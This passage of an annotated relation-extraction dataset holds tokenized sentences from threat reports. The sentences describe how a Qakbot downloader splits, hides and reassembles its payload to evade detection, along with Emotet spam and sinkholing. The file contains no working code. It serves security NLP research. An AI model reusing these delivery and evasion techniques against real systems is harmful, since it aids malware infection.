"evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 3, "t": 4}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 3, "t": 7}, {"r": "EX", "evidence": [2], "h": 4, "t": 6}, {"r": "ST", "evidence": [2, 3], "t": 5, "h": 7}, {"r": "RF", "evidence": [2, 3], "t": 5, "h": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 9}, {"r": "RD", "evidence": [3, 4], "h": 7, "t": 10}, {"r": "EX", "evidence": [6], "t": 11, "h": 12}, {"r": "IJ", "evidence": [6, 7], "h": 12, "t": 13}]}, {"title": "095-4", "sents": [["Additionally", ",", "the", "comment", "string", "``", "CHANGES", "15", "."], ["This", "downloader", "always", "requests", "the", "URL", "``", "/datacollectionservice.php3", ".", "``", "from", "these", "hijacked", "domains", "."], ["The", "domains", "used", "by", "the", "downloader", "for", "this", "request", "are", "XOR", "encrypted", "at", "the", "beginning", "of", "the", "JavaScript", "."], ["The", "response", "to", "this", "request", "is", "obfuscated", "data", "that", "will", "be", "saved", "as", "(", "randalpha", ")", "_1.zzz", "and", "(", "randalpha", ")", "_2.zzz", "."], ["The", "first", "1,000", "bytes", "of", "data", "are", "saved", "to", "the", "first", ".zzz", "file", ",", "while", "the", "remainder", "goes", "to", "the", "second", "file", "."], ["The", "data", "in", "these", "files", "is", "decrypted", "with", "the", "code", "contained", "in", "the", "JavaScript", "downloader", "."], ["Additionally", ",", "a", "scheduled", "task", "is", "created", "to", "execute", "a", "batch", "file", "."], ["This", "code", "serves", "to", "reassemble", "the", "malicious", "Qakbot", "executable", "from", "the", "two", ".zzz", "files", ",", "using", "the", "type", "command", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [10, 10], "name": "downloader", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [14, 14], "name": "URL", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [16, 16], "name": "/datacollectionservice.php3", "pos": [7, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [29, 29], "name": "downloader", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [41, 41], "name": "JavaScript", "pos": [17, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "_1.zzz", "pos": [16, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [64, 64], "name": "_2.zzz", "pos": [21, 22], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [98, 98], "name": "code", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [102, 102], "name": "JavaScript downloader", "pos": [13, 15], "index": "8_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [108, 108], "name": "scheduled task", "pos": [3, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [115, 115], "name": "batch file", "pos": [10, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [119, 119], "name": "code", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [125, 125], "name": "Qakbot executable", "pos": [7, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [130, 130], "name": ".zzz", "pos": [12, 13], "index": "13_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 0, "t": 2}, {"r": "ST", "evidence": [1, 2], "t": 1, "h": 3}, {"r": "RF", "evidence": [1, 2], "t": 1, "h": 3}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "EX", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "RD", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "EX", "evidence": [5], "t": 7, "h": 8}, {"r": "IJ", "evidence": [5, 6], "h": 8, "t": 9}, {"r": "FR", "evidence": [6, 7], "h": 9, "t": 11}, {"r": "EX", "evidence": [6, 7], "t": 10, "h": 11}, {"r": "WR", "evidence": [7], "h": 11, "t": 12}, {"r": "RD", "evidence": [7], "h": 11, "t": 13}]}, {"title": "095-5", "sents": [["This", "downloader", "always", "requests", "the", "URL", "``", "/datacollectionservice.php3", ".", "``", "from", "these", "hijacked", "domains", "."], ["The", "domains", "used", "by", "the", "downloader", "for", "this", "request", "are", "XOR", "encrypted", "at", "the", "beginning", "of", "the", "JavaScript", "."], ["The", "response", "to", "this", "request", "is", "obfuscated", "data", "that", "will", "be", "saved", "as", "(", "randalpha", ")", "_1.zzz", "and", "(", "randalpha", ")", "_2.zzz", "."], ["The", "first", "1,000", "bytes", "of", "data", "are", "saved", "to", "the", "first", ".zzz", "file", ",", "while", "the", "remainder", "goes", "to", "the", "second", "file", "."], ["The", "data", "in", "these", "files", "is", "decrypted", "with", "the", "code", "contained", "in", "the", "JavaScript", "downloader", "."], ["Additionally", ",", "a", "scheduled", "task", "is", "created", "to", "execute", "a", "batch", "file", "."], ["This", "code", "serves", "to", "reassemble", "the", "malicious", "Qakbot", "executable", "from", "the", "two", ".zzz", "files", ",", "using", "the", "type", "command", "."], ["The", "two", ".zzz", "files", "are", "then", "deleted", "after", "the", "reassembled", "executable", "is", "run", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "downloader", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [5, 5], "name": "URL", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "/datacollectionservice.php3", "pos": [7, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "downloader", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "JavaScript", "pos": [17, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "_1.zzz", "pos": [16, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "_2.zzz", "pos": [21, 22], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "code", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "JavaScript downloader", "pos": [13, 15], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [99, 99], "name": "scheduled task", "pos": [3, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [106, 106], "name": "batch file", "pos": [10, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [110, 110], "name": "code", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [116, 116], "name": "Qakbot executable", "pos": [7, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [121, 121], "name": ".zzz", "pos": [12, 13], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [131, 131], "name": ".zzz", "pos": [2, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [139, 139], "name": "executable", "pos": [10, 11], "index": "15_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "RF", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 6}, {"r": "EX", "evidence": [4], "t": 7, "h": 8}, {"r": "IJ", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "FR", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "EX", "evidence": [5, 6], "t": 10, "h": 11}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}, {"r": "RD", "evidence": [6], "h": 11, "t": 13}, {"r": "FR", "evidence": [6, 7], "h": 11, "t": 15}, {"r": "EX", "evidence": [6, 7], "t": 12, "h": 15}, {"r": "UK", "evidence": [7], "t": 14, "h": 15}]}, {"title": "095-6", "sents": [["The", "domains", "used", "by", "the", "downloader", "for", "this", "request", "are", "XOR", "encrypted", "at", "the", "beginning", "of", "the", "JavaScript", "."], ["The", "response", "to", "this", "request", "is", "obfuscated", "data", "that", "will", "be", "saved", "as", "(", "randalpha", ")", "_1.zzz", "and", "(", "randalpha", ")", "_2.zzz", "."], ["The", "first", "1,000", "bytes", "of", "data", "are", "saved", "to", "the", "first", ".zzz", "file", ",", "while", "the", "remainder", "goes", "to", "the", "second", "file", "."], ["The", "data", "in", "these", "files", "is", "decrypted", "with", "the", "code", "contained", "in", "the", "JavaScript", "downloader", "."], ["Additionally", ",", "a", "scheduled", "task", "is", "created", "to", "execute", "a", "batch", "file", "."], ["This", "code", "serves", "to", "reassemble", "the", "malicious", "Qakbot", "executable", "from", "the", "two", ".zzz", "files", ",", "using", "the", "type", "command", "."], ["The", "two", ".zzz", "files", "are", "then", "deleted", "after", "the", "reassembled", "executable", "is", "run", "."], ["This", "may", "allow", "the", "download", "of", "the", "malware", "to", "go", "undetected", ",", "as", "the", "malware", "is", "obfuscated", "when", "it", "is", "downloaded", "and", "saved", "in", "two", "separate", "files", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "downloader", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "JavaScript", "pos": [17, 18], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "_1.zzz", "pos": [16, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [40, 40], "name": "_2.zzz", "pos": [21, 22], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "code", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [78, 78], "name": "JavaScript downloader", "pos": [13, 15], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [84, 84], "name": "scheduled task", "pos": [3, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "batch file", "pos": [10, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [95, 95], "name": "code", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [101, 101], "name": "Qakbot executable", "pos": [7, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [106, 106], "name": ".zzz", "pos": [12, 13], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [116, 116], "name": ".zzz", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [124, 124], "name": "executable", "pos": [10, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [135, 135], "name": "malware", "pos": [7, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [142, 142], "name": "malware", "pos": [14, 15], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "EX", "evidence": [3], "t": 4, "h": 5}, {"r": "IJ", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "FR", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "EX", "evidence": [4, 5], "t": 7, "h": 8}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "RD", "evidence": [5], "h": 8, "t": 10}, {"r": "FR", "evidence": [5, 6], "h": 8, "t": 12}, {"r": "EX", "evidence": [5, 6], "t": 9, "h": 12}, {"r": "UK", "evidence": [6], "t": 11, "h": 12}]}, {"title": "095-7", "sents": [["The", "response", "to", "this", "request", "is", "obfuscated", "data", "that", "will", "be", "saved", "as", "(", "randalpha", ")", "_1.zzz", "and", "(", "randalpha", ")", "_2.zzz", "."], ["The", "first", "1,000", "bytes", "of", "data", "are", "saved", "to", "the", "first", ".zzz", "file", ",", "while", "the", "remainder", "goes", "to", "the", "second", "file", "."], ["The", "data", "in", "these", "files", "is", "decrypted", "with", "the", "code", "contained", "in", "the", "JavaScript", "downloader", "."], ["Additionally", ",", "a", "scheduled", "task", "is", "created", "to", "execute", "a", "batch", "file", "."], ["This", "code", "serves", "to", "reassemble", "the", "malicious", "Qakbot", "executable", "from", "the", "two", ".zzz", "files", ",", "using", "the", "type", "command", "."], ["The", "two", ".zzz", "files", "are", "then", "deleted", "after", "the", "reassembled", "executable", "is", "run", "."], ["This", "may", "allow", "the", "download", "of", "the", "malware", "to", "go", "undetected", ",", "as", "the", "malware", "is", "obfuscated", "when", "it", "is", "downloaded", "and", "saved", "in", "two", "separate", "files", "."], ["These", "files", "are", "then", "decrypted", "and", "reassembled", "using", "the", "type", "command", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "_1.zzz", "pos": [16, 17], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "_2.zzz", "pos": [21, 22], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "code", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [59, 59], "name": "JavaScript downloader", "pos": [13, 15], "index": "3_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [65, 65], "name": "scheduled task", "pos": [3, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "batch file", "pos": [10, 12], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [76, 76], "name": "code", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [82, 82], "name": "Qakbot executable", "pos": [7, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [87, 87], "name": ".zzz", "pos": [12, 13], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [97, 97], "name": ".zzz", "pos": [2, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [105, 105], "name": "executable", "pos": [10, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [116, 116], "name": "malware", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [123, 123], "name": "malware", "pos": [14, 15], "index": "12_0"}]], "labels": [{"r": "EX", "evidence": [2], "t": 2, "h": 3}, {"r": "IJ", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "FR", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "EX", "evidence": [3, 4], "t": 5, "h": 6}, {"r": "WR", "evidence": [4], "h": 6, "t": 7}, {"r": "RD", "evidence": [4], "h": 6, "t": 8}, {"r": "FR", "evidence": [4, 5], "h": 6, "t": 10}, {"r": "EX", "evidence": [4, 5], "t": 7, "h": 10}, {"r": "UK", "evidence": [5], "t": 9, "h": 10}]}, {"title": "095-8", "sents": [["The", "first", "1,000", "bytes", "of", "data", "are", "saved", "to", "the", "first", ".zzz", "file", ",", "while", "the", "remainder", "goes", "to", "the", "second", "file", "."], ["The", "data", "in", "these", "files", "is", "decrypted", "with", "the", "code", "contained", "in", "the", "JavaScript", "downloader", "."], ["Additionally", ",", "a", "scheduled", "task", "is", "created", "to", "execute", "a", "batch", "file", "."], ["This", "code", "serves", "to", "reassemble", "the", "malicious", "Qakbot", "executable", "from", "the", "two", ".zzz", "files", ",", "using", "the", "type", "command", "."], ["The", "two", ".zzz", "files", "are", "then", "deleted", "after", "the", "reassembled", "executable", "is", "run", "."], ["This", "may", "allow", "the", "download", "of", "the", "malware", "to", "go", "undetected", ",", "as", "the", "malware", "is", "obfuscated", "when", "it", "is", "downloaded", "and", "saved", "in", "two", "separate", "files", "."], ["These", "files", "are", "then", "decrypted", "and", "reassembled", "using", "the", "type", "command", "."], ["Because", "of", "this", "update", "to", "persistence", "mechanisms", ",", "the", "transfer", "of", "the", "malicious", "Qbot", "binary", "will", "be", "obfuscated", "to", "the", "point", "that", "some", "security", "products", "could", "miss", "it", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "code", "pos": [9, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "JavaScript downloader", "pos": [13, 15], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [42, 42], "name": "scheduled task", "pos": [3, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "batch file", "pos": [10, 12], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [53, 53], "name": "code", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "Qakbot executable", "pos": [7, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [64, 64], "name": ".zzz", "pos": [12, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [74, 74], "name": ".zzz", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [82, 82], "name": "executable", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [93, 93], "name": "malware", "pos": [7, 8], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [100, 100], "name": "malware", "pos": [14, 15], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [139, 139], "name": "Qbot", "pos": [13, 14], "index": "11_0"}]], "labels": [{"r": "EX", "evidence": [1], "t": 0, "h": 1}, {"r": "IJ", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "FR", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "EX", "evidence": [2, 3], "t": 3, "h": 4}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "RD", "evidence": [3], "h": 4, "t": 6}, {"r": "FR", "evidence": [3, 4], "h": 4, "t": 8}, {"r": "EX", "evidence": [3, 4], "t": 5, "h": 8}, {"r": "UK", "evidence": [4], "t": 7, "h": 8}]}, {"title": "080-0", "sents": [["These", "emails", "are", "typically", "sent", "automatically", "by", "previously", "infected", "systems", "attempting", "to", "infect", "new", "systems", "with", "Emotet", "to", "continue", "growing", "the", "size", "of", "the", "botnets", "associated", "with", "this", "threat", "."], ["In", "many", "cases", ",", "the", "TLDs", "are", "configured", "to", "resolve", "non-existent", "domains", "to", "a", "specific", "IP", "address", "."], ["Whenever", "the", "name", "servers", "associated", "with", "these", "TLDs", "receive", "resolution", "requests", "from", "clients", "on", "the", "internet", "for", "domains", "that", "are", "not", "actively", "configured", "to", "resolve", "to", "a", "specific", "IP", "address", ",", "they", "respond", "with", "a", "default", "IP", "address", "value", ",", "regardless", "of", "whether", "the", "domain", "being", "queried", "is", "invalid", "or", "has", "ever", "existed", "."], ["While", "the", "adversary", "no", "longer", "controls", "the", "domain", ",", "orphaned", "bots", "are", "still", "continuing", "to", "reach", "out", "to", "it", ",", "attempting", "to", "establish", "a", "C2", "channel", "."], ["Note", "that", "it", "currently", "resolves", "to", "the", "default", "IP", "address", "returned", "for", "nonexistent", "domains", "in", "the", "WS", "TLD", "as", "previously", "described", "earlier", "in", "this", "section", "."], ["Sinkholing", "is", "the", "process", "of", "redirecting", "this", "malicious", "botnet", "traffic", "away", "from", "its", "intended", "source", "and", "into", "a", "harmless", "destination", "."], ["It", "spun", "up", "again", "in", "June", "with", "massive", "amounts", "of", "spam", "being", "sent", "starting", "in", "July", "and", "continuing", "through", "to", "the", "present", "time", ",", "with", "intermittent", "pauses", "along", "the", "way", "."], ["Most", "of", "the", "emails", "associated", "with", "Emotet", "feature", "the", "use", "of", "malicious", "attachments", "that", "function", "as", "malware", "downloaders", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "emails", "pos": [1, 2], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [8, 8], "name": "infected systems", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "Emotet", "pos": [16, 17], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [28, 28], "name": "threat", "pos": [28, 29], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "TLDs", "pos": [5, 6], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [41, 41], "name": "domains", "pos": [11, 12], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [45, 45], "name": "IP address", "pos": [15, 17], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [51, 51], "name": "servers", "pos": [3, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "TLDs", "pos": [7, 8], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [60, 60], "name": "clients", "pos": [12, 13], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [84, 84], "name": "IP address", "pos": [36, 38], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [104, 104], "name": "adversary", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [126, 126], "name": "C2 channel", "pos": [24, 26], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [131, 131], "name": "it", "pos": [2, 3], "index": "13_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [137, 137], "name": "IP address", "pos": [8, 10], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [146, 146], "name": "TLD", "pos": [17, 18], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [155, 155], "name": "Sinkholing", "pos": [0, 1], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [163, 163], "name": "botnet traffic", "pos": [8, 10], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [169, 169], "name": "source", "pos": [14, 15], "index": "18_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [174, 174], "name": "destination", "pos": [19, 20], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [176, 176], "name": "It", "pos": [0, 1], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [186, 186], "name": "spam", "pos": [10, 11], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [210, 210], "name": "emails", "pos": [3, 4], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [213, 213], "name": "Emotet", "pos": [6, 7], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [219, 219], "name": "attachments", "pos": [12, 13], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [224, 224], "name": "downloaders", "pos": [17, 18], "index": "25_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0], "h": 1, "t": 3}, {"r": "EX", "evidence": [0], "t": 2, "h": 3}, {"r": "ST", "evidence": [0, 1], "h": 3, "t": 5}, {"r": "RF", "evidence": [0, 1], "h": 3, "t": 5}, {"r": "ST", "evidence": [0, 1], "h": 3, "t": 6}, {"r": "RF", "evidence": [0, 1], "h": 3, "t": 6}, {"r": "ST", "evidence": [0, 1, 2], "h": 3, "t": 7}, {"r": "ST", "evidence": [0, 1, 2], "h": 3, "t": 7}, {"r": "ST", "evidence": [0, 1, 2], "h": 3, "t": 7}, {"r": "ST", "evidence": [0, 1, 2], "h": 3, "t": 7}, {"r": "RF", "evidence": [0, 1, 2], "h": 3, "t": 9}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 6, "t": 10}, {"r": "ST", "evidence": [1, 2, 3], "t": 5, "h": 11}, {"r": "RF", "evidence": [1, 2, 3], "t": 5, "h": 11}, {"r": "ST", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "RF", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 15}, {"r": "EX", "evidence": [3, 4], "h": 11, "t": 15}, {"r": "IJ", "evidence": [3, 4, 5], "h": 11, "t": 16}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "RD", "evidence": [5], "h": 16, "t": 17}, {"r": "RF", "evidence": [5], "h": 16, "t": 18}, {"r": "ST", "evidence": [5], "h": 16, "t": 19}, {"r": "WR", "evidence": [6], "h": 20, "t": 21}, {"r": "RD", "evidence": [7], "t": 22, "h": 23}, {"r": "EX", "evidence": [7], "t": 24, "h": 25}, {"r": "CO", "evidence": [7], "h": 22, "t": 24}]}, {"title": "080-1", "sents": [["In", "many", "cases", ",", "the", "TLDs", "are", "configured", "to", "resolve", "non-existent", "domains", "to", "a", "specific", "IP", "address", "."], ["Whenever", "the", "name", "servers", "associated", "with", "these", "TLDs", "receive", "resolution", "requests", "from", "clients", "on", "the", "internet", "for", "domains", "that", "are", "not", "actively", "configured", "to", "resolve", "to", "a", "specific", "IP", "address", ",", "they", "respond", "with", "a", "default", "IP", "address", "value", ",", "regardless", "of", "whether", "the", "domain", "being", "queried", "is", "invalid", "or", "has", "ever", "existed", "."], ["While", "the", "adversary", "no", "longer", "controls", "the", "domain", ",", "orphaned", "bots", "are", "still", "continuing", "to", "reach", "out", "to", "it", ",", "attempting", "to", "establish", "a", "C2", "channel", "."], ["Note", "that", "it", "currently", "resolves", "to", "the", "default", "IP", "address", "returned", "for", "nonexistent", "domains", "in", "the", "WS", "TLD", "as", "previously", "described", "earlier", "in", "this", "section", "."], ["Sinkholing", "is", "the", "process", "of", "redirecting", "this", "malicious", "botnet", "traffic", "away", "from", "its", "intended", "source", "and", "into", "a", "harmless", "destination", "."], ["It", "spun", "up", "again", "in", "June", "with", "massive", "amounts", "of", "spam", "being", "sent", "starting", "in", "July", "and", "continuing", "through", "to", "the", "present", "time", ",", "with", "intermittent", "pauses", "along", "the", "way", "."], ["Most", "of", "the", "emails", "associated", "with", "Emotet", "feature", "the", "use", "of", "malicious", "attachments", "that", "function", "as", "malware", "downloaders", "."], ["Opening", "the", "attached", "files", "and", "enabling", "the", "malicious", "contents", "causes", "them", "to", "reach", "out", "to", "the", "attacker", "'s", "distribution", "infrastructure", "to", "download", "additional", "malicious", "content", "that", "is", "then", "executed", "on", "the", "victim", "'s", "system", ",", "thus", "infecting", "it", "with", "malware", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "TLDs", "pos": [5, 6], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "domains", "pos": [11, 12], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [15, 15], "name": "IP address", "pos": [15, 17], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [21, 21], "name": "servers", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "TLDs", "pos": [7, 8], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [30, 30], "name": "clients", "pos": [12, 13], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [54, 54], "name": "IP address", "pos": [36, 38], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [74, 74], "name": "adversary", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [96, 96], "name": "C2 channel", "pos": [24, 26], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "it", "pos": [2, 3], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [107, 107], "name": "IP address", "pos": [8, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [116, 116], "name": "TLD", "pos": [17, 18], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [125, 125], "name": "Sinkholing", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [133, 133], "name": "botnet traffic", "pos": [8, 10], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [139, 139], "name": "source", "pos": [14, 15], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [144, 144], "name": "destination", "pos": [19, 20], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [146, 146], "name": "It", "pos": [0, 1], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [156, 156], "name": "spam", "pos": [10, 11], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [180, 180], "name": "emails", "pos": [3, 4], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [183, 183], "name": "Emotet", "pos": [6, 7], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [189, 189], "name": "attachments", "pos": [12, 13], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [194, 194], "name": "downloaders", "pos": [17, 18], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [199, 199], "name": "files", "pos": [3, 4], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [204, 204], "name": "contents", "pos": [8, 9], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [215, 215], "name": "infrastructure", 